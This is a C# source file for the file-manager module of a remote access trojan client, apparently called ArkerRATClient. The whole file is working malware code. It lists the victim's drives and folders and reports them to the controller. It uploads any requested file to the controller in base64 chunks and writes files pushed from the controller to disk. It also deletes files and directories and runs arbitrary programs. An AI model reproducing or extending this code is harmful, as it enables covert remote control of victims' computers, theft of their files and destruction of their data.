using ArkerRATClient;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ARKERRATCLIENT2._0
{
    public static class FileManager
    {
        public static bool download = false;
        static public async void SendFileSystem(string path)
        {
            if (path?.Length<5&&!path.Contains("\\"))
            {
                await RATClientSession.SendData("§FileManagerStart§§drives§" + ListDrives() + "§FileManagerEnd§");
                return;
            }
            else
            {
                var directories = Directory.GetDirectories(path).Where(directory =>
                {
                    var directoryInfo = new DirectoryInfo(directory);
                    return (directoryInfo.Attributes & FileAttributes.Hidden) == 0 && (directoryInfo.Attributes & FileAttributes.System) == 0;
                }).ToArray();

                await RATClientSession.SendData("§FileManagerStart§" + string.Join(",", Directory.GetFiles(path))+"|"+string.Join(",", directories) +"§FileManagerEnd§");
            }
        }

        static private string ListDrives()
        {
            StringBuilder stringBuilder= new StringBuilder();
            foreach (var drive in DriveInfo.GetDrives().ToArray())
            {
                stringBuilder.Append(drive.Name+",");
            }

            return  stringBuilder.ToString().Substring(0, stringBuilder.ToString().Length-1);
        }
       static public ConcurrentQueue<string> dataBuffer = new ConcurrentQueue<string>();
        public async static void StartDownloadingFile(string path)
        {
            download= true;
            using (FileStream stream = new FileStream(path, FileMode.Create, FileAccess.Write))
            {
                while (!RATClientSession.noConnection && download)
                {
                    string temp = string.Empty;
                    while (!dataBuffer.TryDequeue(out temp)) ;

                    byte[] buffer = Convert.FromBase64String(temp);
                    stream.Write(buffer, 0, buffer.Length);
                }
            }
            download= false;
            await RATClientSession.SendData("§FileManagerStart§" + string.Join(",", Directory.GetFiles(path.Substring(0, path.LastIndexOf("\\")+1))) + "|" + string.Join(",", Directory.GetDirectories(path.Substring(0, path.LastIndexOf("\\")+1))) + "§FileManagerEnd§");
        }

        public async static void DeleteObject(string path)
        {
            if (path.Contains("§file§"))
            {
                path=path.Replace("§file§", string.Empty);
                File.Delete(path);
            }
            else
            {
                Directory.Delete(path, true);
            }
            path = path.Substring(0, path.LastIndexOf("\\") + 1);
            await RATClientSession.SendData("§FileManagerStart§" + string.Join(",", Directory.GetFiles(path)) + "|" + string.Join(",", Directory.GetDirectories(path)) + "§FileManagerEnd§");
        }

        public static async void SendFileChunks(string path)
        {
            download= true;
            using (FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.Read))
            {
                await RATClientSession.SendData("§FileManagerStart§§UF§§start§" + path.Substring(path.LastIndexOf("\\")) + "§FileManagerEnd§");

                while (!RATClientSession.noConnection)
                {
                    byte[] buffer = new byte[8192];
                    int bytesRead = fileStream.Read(buffer, 0, buffer.Length);

                    if (bytesRead == 0)
                    {
                        break;
                    }

                    await RATClientSession.SendData("§FileManagerStart§§UF§" + Convert.ToBase64String(buffer, 0, buffer.Length) + "§FileManagerEnd§");
                }
                fileStream.Close();
                await RATClientSession.SendData("§FileManagerStart§§UF§§end§§FileManagerEnd§");
            }
            download= false;
            await RATClientSession.SendData("§FileManagerStart§" + string.Join(",", Directory.GetFiles(path.Substring(0,path.LastIndexOf("\\")))) + "|" + string.Join(",", Directory.GetDirectories(path.Substring(0, path.LastIndexOf("\\")))) + "§FileManagerEnd§");
        }

        public async static void CloseFileManager()
        {
            download = false;
            await Task.Delay(100);
            dataBuffer = new ConcurrentQueue<string>();
        }

        public static void ExecuteFile(string path)
        {
            Process.Start(path);
        }

        public static void CreateNewDirectory(string tempInfo)
        {
            string[] info = tempInfo.Split(',');
            Directory.CreateDirectory(Path.Combine(info));
            //SendFileSystem(info[0]);
        }
    }
}
